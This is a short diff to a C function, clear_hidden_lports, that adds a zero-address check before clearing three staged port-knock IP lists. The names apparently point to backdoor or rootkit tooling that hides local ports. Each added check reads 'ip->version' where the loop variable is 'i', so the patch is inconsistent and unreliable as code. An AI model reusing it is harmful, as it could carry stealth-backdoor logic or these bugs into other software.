@@ -89,13 +89,17 @@ clear_hidden_lports(void)
     knock_list_t_ptr i;
 
     i = ips_stage1_tail;
-    while ((i = remove_knock_from_list(i, &i, i->ip, i->version)));
+    ip_t no_ip = { 0 };
+    if (memcmp(i->ip, no_ip, (ip->version == v4 ? 4 : 16)))
+        while ((i = remove_knock_from_list(i, &i, i->ip, i->version)));
 
     i = ips_stage2_tail;
-    while ((i = remove_knock_from_list(i, &i, i->ip, i->version)));
+    if (memcmp(i->ip, no_ip, (ip->version == v4 ? 4 : 16)))
+        while ((i = remove_knock_from_list(i, &i, i->ip, i->version)));
 
     i = ips_stage3_tail;
-    while ((i = remove_knock_from_list(i, &i, i->ip, i->version)));
+    if (memcmp(i->ip, no_ip, (ip->version == v4 ? 4 : 16)))
+        while ((i = remove_knock_from_list(i, &i, i->ip, i->version)));
 
     lport_list_t_ptr j;
 
